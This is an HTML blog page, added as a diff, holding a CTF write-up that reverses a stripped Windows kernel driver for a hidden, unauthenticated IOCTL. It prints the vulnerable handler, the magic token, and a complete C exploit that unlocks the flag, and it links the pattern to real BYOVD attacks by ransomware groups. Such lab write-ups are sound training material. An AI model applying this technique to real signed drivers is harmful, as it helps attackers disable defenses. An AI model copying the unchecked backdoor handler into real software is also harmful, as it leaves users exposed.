@@ -1,0 +1,326 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>WINSENSOR (OSC Regional 2026) — Hidden IOCTL in a Windows Kernel Driver</title>
+    <meta name="description" content="Writeup for WINSENSOR (OSC Regional 2026) — reverse a stripped x64 Windows kernel driver, find the hidden unauthenticated IOCTL that overwrites the auth variable, and write an exploit to retrieve the flag">
+    <meta property="og:title" content="WINSENSOR (OSC Regional 2026) — Hidden IOCTL in a Windows Kernel Driver" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="article" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/jpeg" href="../avatar.jpg">
+
+    <style>
+      :root {
+        --bg: #121212;
+        --fg: #e0e0e0;
+        --accent: #61dafb;
+        --border: #333;
+        --muted: #a0a0a0;
+      }
+
+      * { box-sizing: border-box; }
+
+      body {
+        margin: 0;
+        padding: 0;
+        background: var(--bg);
+        color: var(--fg);
+        font-family: 'Work Sans', sans-serif;
+        line-height: 1.6;
+      }
+
+      a { color: var(--accent); text-decoration: none; }
+      a:hover { text-decoration: underline; }
+
+      .wrapper {
+        max-width: 768px;
+        margin: 0 auto;
+        padding: 2rem 1rem 3rem;
+      }
+
+      .site-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 3rem;
+      }
+      .site-title { font-weight: 700; font-size: 1.5rem; color: var(--fg); }
+      .site-logo { height: 48px; width: 48px; border-radius: 50%; object-fit: cover; }
+
+      .post { max-width: 768px; margin: 0 auto; }
+
+      .post-header h1 { margin: 0 0 0.5rem; font-size: 2rem; font-weight: 500; }
+      .post-subtitle { margin: 0 0 0.75rem; opacity: 0.8; font-size: 1rem; }
+      .post-meta {
+        margin: 0 0 1.5rem;
+        font-size: 0.9rem;
+        color: var(--muted);
+        display: flex;
+        flex-wrap: wrap;
+        gap: 0.75rem;
+      }
+      .post-tags { display: flex; flex-wrap: wrap; gap: 0.4rem; margin-top: 0.4rem; }
+      .tag {
+        font-size: 0.75rem;
+        padding: 0.15rem 0.5rem;
+        border-radius: 999px;
+        border: 1px solid var(--border);
+        background: rgba(255,255,255,0.02);
+      }
+
+      .post-toc {
+        margin: 2rem 0;
+        padding: 1rem 1.25rem;
+        border-radius: 0.75rem;
+        border: 1px solid var(--border);
+        background: #181818;
+      }
+      .post-toc-title {
+        margin: 0 0 0.5rem;
+        font-size: 0.95rem;
+        font-weight: 500;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+        opacity: 0.8;
+      }
+      .post-toc ul { margin: 0; padding-left: 1.25rem; font-size: 0.95rem; }
+      .post-toc li { margin: 0.1rem 0; }
+
+      section + section { margin-top: 2rem; }
+      h2 { font-size: 1.4rem; margin-bottom: 0.5rem; font-weight: 500; }
+      h3 { font-size: 1.15rem; margin-bottom: 0.4rem; font-weight: 500; }
+      p { margin: 0 0 0.9rem; }
+      ul, ol { padding-left: 1.25rem; margin-top: 0; margin-bottom: 0.9rem; }
+
+      code {
+        font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+        font-size: 0.9rem;
+        background: rgba(255,255,255,0.04);
+        padding: 0.15rem 0.3rem;
+        border-radius: 0.25rem;
+      }
+
+      pre {
+        margin: 0 0 1.25rem;
+        padding: 0.85rem 1rem;
+        background: #0b0b0b;
+        border-radius: 0.5rem;
+        border: 1px solid #1f1f1f;
+        overflow-x: auto;
+      }
+      pre code { background: transparent; padding: 0; }
+
+      .note {
+        padding: 0.75rem 1rem;
+        border-radius: 0.5rem;
+        border: 1px solid var(--border);
+        background: #181818;
+        font-size: 0.92rem;
+        margin-bottom: 1rem;
+      }
+
+      .back-link { margin: 0 0 2rem; font-size: 0.95rem; }
+
+      .site-footer {
+        border-top: 1px solid var(--border);
+        margin-top: 3rem;
+        padding-top: 1rem;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+      .site-footer p { margin: 0; font-size: 0.9rem; opacity: 0.6; }
+    </style>
+  </head>
+  <body>
+    <div class="wrapper">
+
+      <header class="site-header">
+        <a href="/" class="site-title">Alexandru Hossu</a>
+        <img src="../avatar.jpg" alt="Logo" class="site-logo">
+      </header>
+
+      <article class="post">
+        <p class="back-link">← <a href="index.html">Back to blog</a></p>
+
+        <header class="post-header">
+          <h1>WINSENSOR (OSC Regional 2026) — Hidden IOCTL in a Windows Kernel Driver</h1>
+          <p class="post-subtitle">
+            A stripped x64 Windows kernel driver with three IOCTL handlers — two documented, one not. The hidden one writes directly to the driver's auth variable with no privilege check, unlocking the flag. The pattern is exactly how BYOVD attacks work in the wild.
+          </p>
+          <p class="post-meta">
+            <span>pwn • Windows Kernel • Reverse Engineering</span>
+            <span>OSC Regional 2026</span>
+            <span>Challenge by Alexandru Hossu</span>
+          </p>
+          <div class="post-tags">
+            <span class="tag">Windows Kernel</span>
+            <span class="tag">IOCTL</span>
+            <span class="tag">BYOVD</span>
+            <span class="tag">IDA / Ghidra</span>
+            <span class="tag">Named Pipe</span>
+          </div>
+        </header>
+
+        <nav class="post-toc">
+          <p class="post-toc-title">On this page</p>
+          <ul>
+            <li><a href="#setup">Challenge setup</a></li>
+            <li><a href="#reversing">Step 1 — reversing WinSensor.sys</a></li>
+            <li><a href="#vuln">Step 2 — the vulnerability</a></li>
+            <li><a href="#token">Step 3 — finding ADMIN_TOKEN</a></li>
+            <li><a href="#exploit">Step 4 — writing the exploit</a></li>
+            <li><a href="#realworld">Why this is realistic</a></li>
+          </ul>
+        </nav>
+
+        <section id="setup">
+          <h2>Challenge setup</h2>
+          <p>You get <code>WinSensor.sys</code> — a 64-bit Windows kernel driver PE, stripped, native subsystem. The server takes your <code>exploit.exe</code>, runs it against a live driver instance, and streams the output back. Flag comes out only if you authenticate correctly with the driver.</p>
+          <p>The driver exposes its interface through a named pipe at <code>\\.\pipe\WinSensor</code>. The protocol is straightforward binary little-endian:</p>
+          <ul>
+            <li>Request: <code>uint32_t ioctl_code | uint32_t in_len | data[in_len]</code></li>
+            <li>Response: <code>uint32_t ntstatus | uint32_t out_len | data[out_len]</code></li>
+          </ul>
+        </section>
+
+        <section id="reversing">
+          <h2>Step 1 — reversing WinSensor.sys</h2>
+          <p>Load in Ghidra or IDA. Because it's a native subsystem PE, the entry point is <code>DriverEntry</code>. It sets a function pointer at <code>DRIVER_OBJECT+0x38+0x0E*8</code> — that's the <code>IRP_MJ_DEVICE_CONTROL</code> dispatch slot. Follow it to <code>WinSensorDeviceControl</code>.</p>
+          <p>Inside there is a switch on the IOCTL code. Three cases:</p>
+          <pre><code>| IOCTL Code   | Name                       | Notes                    |
+|--------------|----------------------------|--------------------------|
+| 0x88000000   | IOCTL_SENSOR_GET_VERSION   | Returns version string   |
+| 0x88000004   | IOCTL_SENSOR_READ_FLAG     | Returns flag (auth-gated)|
+| 0x8800001C   | IOCTL_SENSOR_WRITE_TOKEN   | Not in docs, function=7  |</code></pre>
+          <p>IOCTL codes are computed via <code>CTL_CODE(DeviceType, Function, Method, Access)</code>. The formula simplifies to <code>(DeviceType &lt;&lt; 16) | (Function &lt;&lt; 2)</code> when method and access are both zero. With device type <code>0x8800</code>, function codes 0 and 1 give the two obvious handlers. Function code 7 produces <code>0x8800001C</code> — that's the hidden one.</p>
+        </section>
+
+        <section id="vuln">
+          <h2>Step 2 — the vulnerability</h2>
+          <p><code>IOCTL_SENSOR_READ_FLAG</code> checks <code>g_auth_token == ADMIN_TOKEN</code> before returning anything. The gate for FLAG access is a single global variable comparison.</p>
+          <p>Now look at what <code>IOCTL_SENSOR_WRITE_TOKEN</code> does:</p>
+          <pre><code>case IOCTL_SENSOR_WRITE_TOKEN:
+    if (inLen &lt; sizeof(ULONGLONG)) { status = STATUS_INVALID_PARAMETER; break; }
+    g_auth_token = *(ULONGLONG *)buf;   /* no validation whatsoever */
+    status = STATUS_SUCCESS;
+    break;</code></pre>
+          <p>No privilege check. No caller verification. Anyone holding a handle to the pipe can send 8 bytes and overwrite <code>g_auth_token</code> to any value they want. Call it with <code>ADMIN_TOKEN</code> first, then call <code>IOCTL_SENSOR_READ_FLAG</code> — that's the whole exploit.</p>
+          <div class="note">
+            This is a diagnostic backdoor — a handler added during development for internal testing that was never gated, never removed, and not listed in the public SDK headers. The only sign of its existence is the function code in the binary.
+          </div>
+        </section>
+
+        <section id="token">
+          <h2>Step 3 — finding ADMIN_TOKEN</h2>
+          <p>The comparison in <code>IOCTL_SENSOR_READ_FLAG</code> is easy to spot in disassembly:</p>
+          <pre><code>CMP  RAX, 0xC0FFEE1337DEAD01</code></pre>
+          <p>Or find it in <code>.rdata</code> as little-endian bytes:</p>
+          <pre><code>01 AD DE 37 13 EE FF C0</code></pre>
+          <p><code>ADMIN_TOKEN = 0xC0FFEE1337DEAD01</code></p>
+        </section>
+
+        <section id="exploit">
+          <h2>Step 4 — writing the exploit</h2>
+          <p>Three operations in order: open the pipe, write the token via the hidden IOCTL, read the flag.</p>
+          <pre><code>/*
+ * solve.c -- WINSENSOR CTF challenge solution
+ *
+ * Steps (found by reversing WinSensor.sys):
+ *   1. Open \\.\pipe\WinSensor
+ *   2. IOCTL 0x88000000 -> get version (optional sanity check)
+ *   3. IOCTL 0x8800001C with ADMIN_TOKEN (0xC0FFEE1337DEAD01) -> unlock
+ *   4. IOCTL 0x88000004 -> read flag
+ *
+ * Compile:
+ *   x86_64-w64-mingw32-gcc -O2 -o exploit.exe solve.c -lkernel32
+ */
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;string.h&gt;
+
+#define IOCTL_GET_VERSION   0x88000000UL
+#define IOCTL_READ_FLAG     0x88000004UL
+#define IOCTL_WRITE_TOKEN   0x8800001CUL   /* hidden -- not in public docs */
+
+static const uint64_t ADMIN_TOKEN = 0xC0FFEE1337DEAD01ULL;
+
+static int pipe_write(HANDLE h, const void *b, DWORD n) {
+    DWORD t=0,w; while(t&lt;n){if(!WriteFile(h,(char*)b+t,n-t,&amp;w,NULL)||!w)return 0;t+=w;} return 1;
+}
+static int pipe_read(HANDLE h, void *b, DWORD n) {
+    DWORD t=0,g; while(t&lt;n){if(!ReadFile(h,(char*)b+t,n-t,&amp;g,NULL)||!g)return 0;t+=g;} return 1;
+}
+
+static uint32_t ioctl(HANDLE h, uint32_t code,
+                      const void *in, uint32_t in_n,
+                      void *out, uint32_t *out_n)
+{
+    uint32_t hdr[2]={code,in_n};
+    if(!pipe_write(h,hdr,8)) return 0xDEAD;
+    if(in_n) pipe_write(h,in,in_n);
+    uint32_t r[2]; pipe_read(h,r,8);
+    if(r[1]&amp;&amp;out&amp;&amp;out_n){pipe_read(h,out,r[1]&lt;*out_n?r[1]:*out_n);*out_n=r[1];}
+    else if(out_n)*out_n=0;
+    return r[0];
+}
+
+int main(void) {
+    HANDLE h = CreateFileA("\\\\.\\pipe\\WinSensor",
+        GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    if(h==INVALID_HANDLE_VALUE){printf("[-] open failed: %lu\n",GetLastError());return 1;}
+
+    /* step 1: get version (sanity) */
+    char ver[64]={0}; uint32_t vl=sizeof(ver);
+    ioctl(h, IOCTL_GET_VERSION, NULL, 0, ver, &amp;vl);
+    printf("[*] %s\n", ver);
+
+    /* step 2: write admin token (vulnerability -- unchecked write to auth var) */
+    ioctl(h, IOCTL_WRITE_TOKEN, &amp;ADMIN_TOKEN, 8, NULL, NULL);
+    printf("[+] Token written\n");
+
+    /* step 3: read flag */
+    char flag[256]={0}; uint32_t fl=sizeof(flag);
+    uint32_t st = ioctl(h, IOCTL_READ_FLAG, NULL, 0, flag, &amp;fl);
+    if(st==0) printf("[+] %s\n", flag);
+    else printf("[-] READ_FLAG failed: 0x%08X\n", st);
+
+    CloseHandle(h);
+    return 0;
+}</code></pre>
+          <p>Compile and submit:</p>
+          <pre><code>x86_64-w64-mingw32-gcc -O2 -o exploit.exe solve.c -lkernel32
+base64 -w 0 exploit.exe
+# paste output into the nc session, then send a line with just: END</code></pre>
+          <p>Expected output:</p>
+          <pre><code>[*] SensorTech HWMon v2.0.1
+[+] Token written
+[+] CTF{&lt;64 hex chars&gt;}</code></pre>
+        </section>
+
+        <section id="realworld">
+          <h2>Why this is realistic</h2>
+          <p>BYOVD — Bring Your Own Vulnerable Driver — is an established attacker technique for bypassing kernel-level defenses. The pattern: find a legitimate, signed hardware monitoring driver with a privileged IOCTL that has no access control, load it via the official Windows driver loading mechanism (which bypasses most EDR hooks because it goes through the kernel's own code signing path), then use the exposed IOCTL to read or write arbitrary kernel memory.</p>
+          <p>RTCore64.sys, a hardware monitoring driver from Micro-Star International, has an undocumented IOCTL that allows any user-mode process to read and write arbitrary physical memory. The BlackByte ransomware group used it to terminate EDR processes from kernel memory before deploying ransomware. MSI Afterburner's driver has had similar issues. In both cases the underlying cause is the same: a diagnostic function added during development, never access-controlled, never removed before release.</p>
+          <p>The CTF strips out the full attack chain — dropping a driver, loading it, walking kernel memory structures to find and terminate protection processes — and reduces it to the core reversing problem: find the hidden function code and the magic constant. Everything else follows from those two numbers.</p>
+          <div class="note">
+            The challenge was intentionally kept at medium difficulty. The full BYOVD exploitation path requires enumerating kernel memory, finding EPROCESS/ETHREAD structures, and patching protection flags — that's a separate challenge entirely. Here the focus is purely on recognizing the diagnostic backdoor pattern in a binary and deriving the protocol from the disassembly.
+          </div>
+        </section>
+      </article>
+
+      <footer class="site-footer">
+        <p>2026 &copy; Alexandru Hossu</p>
+      </footer>
+
+    </div>
+  </body>
+</html>
